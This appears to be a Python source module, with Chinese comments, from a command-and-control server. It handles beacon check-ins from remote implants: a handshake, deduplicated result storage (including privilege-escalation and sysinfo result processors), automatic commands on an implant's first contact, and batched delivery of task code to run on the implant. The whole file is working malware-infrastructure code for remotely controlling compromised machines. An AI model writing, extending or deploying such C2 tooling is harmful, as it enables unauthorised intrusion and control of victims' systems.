"""Beacon 会话（v2 批量任务模型）。

流程: 握手（register/welcome，协议版本严格相等 + batch 标记强校验）→
implant 上报批量结果（RESULT ×N → FETCH）→ 服务端确认（acked）+ 一次性
下发全部 pending 任务（TASKS 帧，按字节预算分批）→ PONG → 断开。

批量语义:
- 结果: implant 本地执行完的任务结果在下次回连时带上;服务端按 task_id
  去重(implant 重发未获 ACK 的结果),确认信息随 TASKS 帧 acked 回执。
- 任务: 服务端 drain 队列一次性全部下发,implant 断开后本地每任务一线程
  执行,执行完的结果下次回连上报——服务端不再逐条等待(旧模型废弃)。

fire-and-forget 语义（10.2）: 结果收到就存,没收到(断连)则 implant 下次
重发,去重兜底。不追踪任务状态。

register / 结果落库 / auto_commands / 结果处理器 抽在 sessions/engine.py,
与 HTTPS/DNS 传输共用同一实现。
"""

import json

from server.core.protocol import (
    send_frame, recv_frame, validate_message, TASKS, RESULT, FETCH, PONG,
)
from server.core.events import (
    EVT_DISCONNECT, EVT_TASK_SENT, EVT_AUTO_CMD_SENT,
)
from server.core.log import get_logger
from .base import handshake, send_welcome, send_error, SessionError
from .engine import (
    register_beacon, store_result, build_auto_tasks, drain_tasks,
    batch_response, InFlight,
)

logger = get_logger("beacon_session")


class BeaconSession:
    """Beacon 连接会话（v2 批量模型）。"""

    def __init__(self, sock, key: bytes, expected_role: str,
                 mgr, tq, events, config, modules, smods, dispatcher=None):
        self._sock = sock
        self._key = key
        self._expected_role = expected_role
        self._mgr = mgr
        self._tq = tq
        self._events = events
        self._config = config
        self._modules = modules
        self._smods = smods
        self._dispatcher = dispatcher  # 结果处理器续传 + auto_commands 用
        self._client_id = ""           # 注册成功后填充（close 清 active 用）
        self._is_fork = False          # 注册时标记（跳过 auto_commands）
        # 任务在途登记: task_id -> (result_processor, proc_arg)。
        # TCP 批量下发即出队,结果在**后续连接**回来——登记表必须跨会话
        # (server 级共享,挂在 mgr 上;与 HTTPS/DNS 无状态通道的 InFlight
        # 同机制,修复 priv_esc/sysinfo 结果处理器在 TCP 通道失效的问题)。
        inflight = getattr(mgr, "_inflight", None)
        if inflight is None:
            inflight = InFlight()
            mgr._inflight = inflight
        self._inflight = inflight

    def run(self) -> None:
        try:
            self._sock.settimeout(self._config.socket_timeout)
            reg = handshake(self._sock, self._key, self._expected_role,
                            self._config.max_frame_size)
            # v2: batch 标记强校验——旧植入物(无 batch)直接拒绝,不做向下兼容
            if reg.get("batch") is not True:
                raise SessionError("BAD_JSON", "v2 protocol requires batch=true")
            # 注册（含 via 标记）先于 welcome：welcome 语义 = 注册成功
            client_id, is_new = self._register(reg)
            self._client_id = client_id
            send_welcome(self._sock, self._key)
            self._task_cycle(client_id, is_new)
        except SessionError as e:
            logger.warning("handshake failed: %s", e.message)
            send_error(self._sock, self._key, e.code, e.message)
        except (ConnectionError, ValueError):
            logger.debug("beacon connection closed")
        except Exception:
            logger.exception("beacon session error")

    def close(self) -> None:
        try:
            self._sock.close()
        except OSError:
            pass
        # 会话结束：清活跃标记（cleanup 竞态防护，S9）
        rec = self._mgr.get_client(self._client_id)
        if rec:
            rec.active = False

    # ── 主流程 ──

    def _register(self, reg: dict) -> tuple:
        """注册 + via/fork/shell 标记 + 上线事件（共享引擎）。"""
        self._is_fork = bool(reg.get("fork", False))
        return register_beacon(reg, self._mgr, self._events)

    def _task_cycle(self, client_id: str, is_new: bool) -> None:
        """批量周期: 收结果 → auto 任务入队 → 一次性下发全部任务 → PONG。"""
        acked = []
        # ① 收批量结果（implant 逐条上报已执行完的结果,最后发 FETCH）
        while True:
            try:
                raw = recv_frame(self._sock, self._key,
                                 max_frame_size=self._config.max_frame_size)
            except (ConnectionError, ValueError):
                return  # 结果收到几条算几条（fire-and-forget,下次重发去重）
            result = json.loads(raw.decode("utf-8"))
            if validate_message(result):
                logger.warning("beacon %s sent invalid message: %s",
                               client_id[:8], result.get("type"))
                return
            mtype = result.get("type")
            if mtype == RESULT:
                rp, pa = self._inflight.take(result.get("task_id", ""))
                store_result(client_id, result.get("task_id", ""),
                             result.get("output", ""), result.get("error", ""),
                             self._mgr, self._events,
                             self._config.max_result_size,
                             smods=self._smods, dispatcher=self._dispatcher,
                             result_processor=rp, proc_arg=pa)
                acked.append(result.get("task_id", ""))
                # 逐条确认帧: implant 发一帧收一帧(TCP/HTTPS/DNS 统一),
                # 未收到确认的结果下次回连重发(服务端 task_id 去重)
                try:
                    send_frame(self._sock,
                               json.dumps({"type": TASKS, "tasks": [],
                                           "acked": [result.get("task_id", "")]})
                               .encode("utf-8"), self._key)
                except Exception:
                    return
            elif mtype == FETCH:
                break  # 结果收完,开始下发
            else:
                logger.warning("beacon %s sent non-result during batch: %s",
                               client_id[:8], mtype)
                return

        # ② 首次上线: auto_commands 全量入队（随批量一起下发,FIFO 在前）
        if is_new and not self._is_fork:
            for task in build_auto_tasks(self._config.auto_commands,
                                         client_id, self._dispatcher):
                self._tq.push(client_id, task)
                self._events.emit(EVT_AUTO_CMD_SENT, client_id,
                                  task_id=task.task_id)

        # ③ 一次性下发全部 pending 任务（按字节预算分批,acked 首批携带）
        tasks = drain_tasks(client_id, self._tq)
        budget = max(4096, int(self._config.max_frame_size * 0.8))
        for frame in batch_response(acked, tasks, budget):
            for t in frame["tasks"]:
                # 用 task_id 找回原 Task 对象登记处理器(批量帧只带 id/code)
                for orig in tasks:
                    if orig.task_id == t["task_id"]:
                        self._inflight.track(orig)
                        break
            try:
                send_frame(self._sock,
                           json.dumps({"type": TASKS, **frame}).encode("utf-8"),
                           self._key)
            except Exception:
                # 断线: 本批任务逆序 push_front 保序,下次回连重发
                for t in reversed(frame["tasks"]):
                    from server.task_queue import Task
                    self._tq.push_front(client_id,
                                        Task(code=t["code"], task_id=t["task_id"]))
                return
            for t in frame["tasks"]:
                self._events.emit(EVT_TASK_SENT, client_id, task_id=t["task_id"])
            # shell 文本任务 exit/break 已确认下发: 立即复位 is_shell,
            # 消除退出后到下次基础注册之间的误路由窗口
            if any(t["code"].strip() in ("exit", "break")
                   for t in frame["tasks"]):
                rec = self._mgr.get_client(client_id)
                if rec is not None:
                    rec.is_shell = False

        # ④ 结束本周期（implant 断开,本地执行任务）
        try:
            send_frame(self._sock,
                       json.dumps({"type": PONG}).encode("utf-8"), self._key)
        except Exception:
            pass
        self._events.emit(EVT_DISCONNECT, client_id)
